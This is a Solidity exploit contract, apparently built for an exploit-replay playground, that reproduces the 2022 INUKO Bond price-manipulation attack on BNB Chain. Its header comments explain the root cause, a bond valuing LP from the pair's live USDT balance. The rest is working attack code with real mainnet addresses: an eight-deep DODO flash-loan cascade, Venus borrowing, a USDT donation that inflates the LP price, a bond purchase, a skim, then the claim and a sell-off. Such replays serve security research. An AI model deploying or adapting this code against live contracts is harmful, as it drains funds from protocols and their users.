// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-10-INUKO).
//
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry `ContractTest`
// harness — the 8-deep DODO flash-loan callback `DPPFlashLoanCall` lives on the
// test itself (`assetTo = address(this)`), and profit (USDT) is left on the test
// contract, so there is no standalone contract to deploy. This file is a
// faithful, self-contained copy of that inline attack (no imports, so it
// compiles anywhere), compiled inside the registry forge project. Logic and
// constants are copied verbatim from test/INUKO_exp.sol.
//
// The attack is split into two entrypoints because the playground replays the
// whole exploit at a SINGLE block timestamp, but the Foundry test does a
// `cheats.warp(block.timestamp + 3 days)` BETWEEN buyBond() and claim() to clear
// the bond's locking period:
//   - seed()   — UNRECORDED prep run from `setup`: wrap 5 BNB, addLiquidity
//                (acquire the LP), then the full 8-deep DODO flash-loan cascade
//                that borrows USDT from Venus, donates it to the INUKO/USDT pair,
//                calls buyBond() at the manipulated price, skims the donation
//                back, and repays all loans. Mirrors testExploit() steps up to
//                (and including) buyBond + skim + repay.
//   - attack() — RECORDED: claim(0) (paid out at the manipulated amount) + the
//                three INUKO→USDT dump swaps. Mirrors claimAndSell().
// Because the lock period cannot elapse at one timestamp, the config patches
// `bondData[currentBondId].releaseTimeStamp` to 0 via a setup `storeSlot` step
// after seed() so the recorded claim() passes its time guard — functionally
// identical to the test's vm.warp(+3d).
//
// Root cause: Bond.LpToToken() values deposited LP from the pair's LIVE
// `USDT.balanceOf(pair)` instead of sync'd getReserves(), so transferring USDT
// straight into the pair (no LP minted, no sync) inflates the per-LP value ~20×.
// buyBond() snapshots that inflated value into bondData.amount and claim() pays
// it out verbatim later — the attacker only needs price control for one tx.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external;
    function transfer(address, uint256) external;
}

interface IBond {
    function buyBond(uint256 lpAmount, uint256 bondId) external;
    function claim(uint256 index) external;
}

interface IVToken {
    function mint(uint256 mintAmount) external;
    function mint() external payable;
    function redeemUnderlying(uint256 redeemAmount) external;
    function borrow(uint256 borrowAmount) external;
    function repayBorrow(uint256 repayAmount) external;
}

interface IUnitroller {
    function enterMarkets(address[] calldata vTokens) external;
    function getAccountLiquidity(address account) external returns (uint256, uint256, uint256);
}

interface IRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);
}

interface IPair {
    function skim(address to) external;
    function balanceOf(address) external view returns (uint256);
    function approve(address spender, uint256 amount) external;
}

interface IDVM {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
    function _BASE_TOKEN_() external view returns (address);
    function _QUOTE_TOKEN_() external view returns (address);
}

contract INUKODrain {
    IERC20 constant INUKO = IERC20(0xEa51801b8F5B88543DdaD3D1727400c15b209D8f);
    IERC20 constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 constant WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 constant BUSD = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    IERC20 constant ETH = IERC20(0x2170Ed0880ac9A755fd29B2688956BD959F933F8);
    IERC20 constant BTCB = IERC20(0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c);
    IRouter constant Router = IRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    IPair constant Pair = IPair(0xD50B9Bcd8B7D4B791EA301DBCC8318EE854d8B67);
    IVToken constant vBNB = IVToken(0xA07c5b74C9B40447a954e1466938b865b6BBea36);
    IVToken constant vBUSD = IVToken(0x95c78222B3D6e262426483D42CfA53685A67Ab9D);
    IVToken constant vETH = IVToken(0xf508fCD89b8bd15579dc79A6827cB4686A3592c8);
    IVToken constant vBTC = IVToken(0x882C173bC7Ff3b7786CA16dfeD3DFFfb9Ee7847B);
    IVToken constant vUSDT = IVToken(0xfD5840Cd36d94D7229439859C0112a4185BC0255);
    IUnitroller constant unitroller = IUnitroller(0xfD36E2c2a6789Db23113685031d7F16329158384);
    IBond constant bond = IBond(0x09beDDae85a9b5Ada57a5bd7979bb7b3dd08B538);

    address constant dodo1 = 0xDa26Dd3c1B917Fbf733226e9e71189ABb4919E3f;
    address constant dodo2 = 0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4;
    address constant dodo3 = 0xD7B7218D778338Ea05f5Ecce82f86D365E25dBCE;
    address constant dodo4 = 0xFeAFe253802b77456B4627F8c2306a9CeBb5d681;
    address constant dodo5 = 0x7A3F460F37AE8A8FF2C2440B8A8ee784cCD0B543;
    address constant dodo6 = 0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A;
    address constant dodo7 = 0x9BA8966B706c905E594AcbB946Ad5e29509f45EB;
    address constant dodo8 = 0x26d0c625e5F5D6de034495fbDe1F6e9377185618;

    IERC20 token1;
    IERC20 token2;
    uint256 amount1;
    uint256 amount2;
    uint256 amount3;
    uint256 amount4;
    uint256 amount5;
    uint256 amount6;
    uint256 amount7;
    uint256 amount8;
    uint256 amount9;
    uint256 amount10;
    uint256 amount11;
    uint256 amount12;
    uint256 amount13;
    uint256 amount14;
    uint256 amount15;
    uint256 amount16;

    // UNRECORDED prep — mirrors testExploit() up to and including the flash-loan
    // cascade + venusLendingAndRepay (which does buyBond + skim + repay). Funded
    // with 5 BNB by setup.fundAttackerWei (forwarded as msg.value from the setup
    // rawCall, hence payable).
    function seed() external payable {
        address(WBNB).call{value: 5 ether}("");
        addLiquidity();
        buyBond();
    }

    // RECORDED entrypoint — mirrors claimAndSell() (test steps after vm.warp).
    // The release lock is cleared by a setup storeSlot patch (the playground
    // replays at a single timestamp, so the test's +3-day warp can't be applied).
    function attack() external {
        bond.claim(0);
        INUKO.approve(address(Router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(INUKO);
        path[1] = address(USDT);
        // TX LIMIT — split across three swaps, verbatim from the test.
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            25_000 * 1e18, 0, path, address(this), block.timestamp
        );
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            25_000 * 1e18, 0, path, address(this), block.timestamp
        );
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            INUKO.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }

    function addLiquidity() internal {
        WBNB.approve(address(Router), type(uint256).max);
        address[] memory path = new address[](3);
        path[0] = address(WBNB);
        path[1] = address(USDT);
        path[2] = address(INUKO);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            WBNB.balanceOf(address(this)) / 2, 0, path, address(this), block.timestamp
        );

        address[] memory path1 = new address[](2);
        path1[0] = address(WBNB);
        path1[1] = address(USDT);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            WBNB.balanceOf(address(this)), 0, path1, address(this), block.timestamp
        );

        USDT.approve(address(Router), type(uint256).max);
        INUKO.approve(address(Router), type(uint256).max);
        Router.addLiquidity(
            address(USDT),
            address(INUKO),
            USDT.balanceOf(address(this)),
            INUKO.balanceOf(address(this)),
            0,
            0,
            address(this),
            block.timestamp
        );

        Pair.approve(address(bond), type(uint256).max);
    }

    function buyBond() internal {
        token1 = IERC20(IDVM(dodo1)._BASE_TOKEN_());
        token2 = IERC20(IDVM(dodo1)._QUOTE_TOKEN_());
        amount1 = token1.balanceOf(dodo1);
        amount2 = token2.balanceOf(dodo1);
        IDVM(dodo1).flashLoan(amount1, amount2, address(this), new bytes(1)); // WBNB USDT
    }

    function DPPFlashLoanCall(
        address sender,
        uint256 baseAmount,
        uint256 quoteAmount,
        bytes calldata data
    ) external payable {
        if (msg.sender == dodo1) {
            WBNB_BUSD_Pair_Loan();
        } else if (msg.sender == dodo2) {
            ETH_USDT_Pair_Loan1();
        } else if (msg.sender == dodo3) {
            WBNB_USDT_Pair_Loan();
        } else if (msg.sender == dodo4) {
            BTCB_BUSD_Pair_Loan();
        } else if (msg.sender == dodo5) {
            ETH_USDT_Pair_Loan2();
        } else if (msg.sender == dodo6) {
            ETH_BUSD_Pair_Loan();
        } else if (msg.sender == dodo7) {
            BTCB_USDT_Pair_Loan();
        } else if (msg.sender == dodo8) {
            venusLendingAndRepay();
            BTCB.transfer(dodo8, amount15);
            USDT.transfer(dodo8, amount16);
        }
    }

    function WBNB_BUSD_Pair_Loan() internal {
        token1 = IERC20(IDVM(dodo2)._BASE_TOKEN_());
        token2 = IERC20(IDVM(dodo2)._QUOTE_TOKEN_());
        amount3 = token1.balanceOf(dodo2);
        amount4 = token2.balanceOf(dodo2);
        IDVM(dodo2).flashLoan(amount3, amount4, address(this), new bytes(1));
        WBNB.transfer(dodo1, amount1);
        USDT.transfer(dodo1, amount2);
    }

    function ETH_USDT_Pair_Loan1() internal {
        token1 = IERC20(IDVM(dodo3)._BASE_TOKEN_());
        token2 = IERC20(IDVM(dodo3)._QUOTE_TOKEN_());
        amount5 = token1.balanceOf(dodo3);
        amount6 = token2.balanceOf(dodo3);
        IDVM(dodo3).flashLoan(amount5, amount6, address(this), new bytes(1));
        WBNB.transfer(dodo2, amount3);
        BUSD.transfer(dodo2, amount4);
    }

    function WBNB_USDT_Pair_Loan() internal {
        token1 = IERC20(IDVM(dodo4)._BASE_TOKEN_());
        token2 = IERC20(IDVM(dodo4)._QUOTE_TOKEN_());
        amount7 = token1.balanceOf(dodo4);
        amount8 = token2.balanceOf(dodo4);
        IDVM(dodo4).flashLoan(amount7, amount8, address(this), new bytes(1));
        ETH.transfer(dodo3, amount5);
        USDT.transfer(dodo3, amount6);
    }

    function BTCB_BUSD_Pair_Loan() internal {
        token1 = IERC20(IDVM(dodo5)._BASE_TOKEN_());
        token2 = IERC20(IDVM(dodo5)._QUOTE_TOKEN_());
        amount9 = token1.balanceOf(dodo5);
        amount10 = token2.balanceOf(dodo5);
        IDVM(dodo5).flashLoan(amount9, amount10, address(this), new bytes(1));
        WBNB.transfer(dodo4, amount7);
        USDT.transfer(dodo4, amount8);
    }

    function ETH_USDT_Pair_Loan2() internal {
        token1 = IERC20(IDVM(dodo6)._BASE_TOKEN_());
        token2 = IERC20(IDVM(dodo6)._QUOTE_TOKEN_());
        amount11 = token1.balanceOf(dodo6);
        amount12 = token2.balanceOf(dodo6);
        IDVM(dodo6).flashLoan(amount11, amount12, address(this), new bytes(1));
        BTCB.transfer(dodo5, amount9);
        BUSD.transfer(dodo5, amount10);
    }

    function ETH_BUSD_Pair_Loan() internal {
        token1 = IERC20(IDVM(dodo7)._BASE_TOKEN_());
        token2 = IERC20(IDVM(dodo7)._QUOTE_TOKEN_());
        amount13 = token1.balanceOf(dodo7);
        amount14 = token2.balanceOf(dodo7);
        IDVM(dodo7).flashLoan(amount13, amount14, address(this), new bytes(1)); // WBNB BUSD
        ETH.transfer(dodo6, amount11);
        USDT.transfer(dodo6, amount12);
    }

    function BTCB_USDT_Pair_Loan() internal {
        token1 = IERC20(IDVM(dodo8)._BASE_TOKEN_());
        token2 = IERC20(IDVM(dodo8)._QUOTE_TOKEN_());
        amount15 = token1.balanceOf(dodo8);
        amount16 = token2.balanceOf(dodo8);
        IDVM(dodo8).flashLoan(amount15, amount16, address(this), new bytes(1)); // WBNB BUSD
        ETH.transfer(dodo7, amount13);
        BUSD.transfer(dodo7, amount14);
    }

    function venusLendingAndRepay() public payable {
        uint256 BNBAmount = WBNB.balanceOf(address(this));
        address(WBNB).call(abi.encodeWithSignature("withdraw(uint256)", BNBAmount));
        uint256 BUSDAmount = BUSD.balanceOf(address(this));
        uint256 ETHAmount = ETH.balanceOf(address(this));
        uint256 BTCBAmount = BTCB.balanceOf(address(this));
        address[] memory cTokens = new address[](5);
        cTokens[0] = address(vBNB);
        cTokens[1] = address(vUSDT);
        cTokens[2] = address(vBUSD);
        cTokens[3] = address(vETH);
        cTokens[4] = address(vBTC);
        unitroller.enterMarkets(cTokens);
        vBNB.mint{value: BNBAmount}();
        BUSD.approve(address(vBUSD), type(uint256).max);
        vBUSD.mint(BUSDAmount);
        ETH.approve(address(vETH), type(uint256).max);
        vETH.mint(ETHAmount);
        BTCB.approve(address(vBTC), type(uint256).max);
        vBTC.mint(BTCBAmount);
        (, uint256 amount,) = unitroller.getAccountLiquidity(address(this));

        vUSDT.borrow(amount * 99 / 100);
        USDT.transfer(address(Pair), USDT.balanceOf(address(this)));
        bond.buyBond(Pair.balanceOf(address(this)), 0);
        Pair.skim(address(this));
        USDT.approve(address(vUSDT), type(uint256).max);
        vUSDT.repayBorrow(amount * 99 / 100);
        vBNB.redeemUnderlying(BNBAmount);
        address(WBNB).call{value: address(this).balance}("");
        vBUSD.redeemUnderlying(BUSDAmount);
        vETH.redeemUnderlying(ETHAmount);
        vBTC.redeemUnderlying(BTCBAmount);
    }

    receive() external payable {}
}
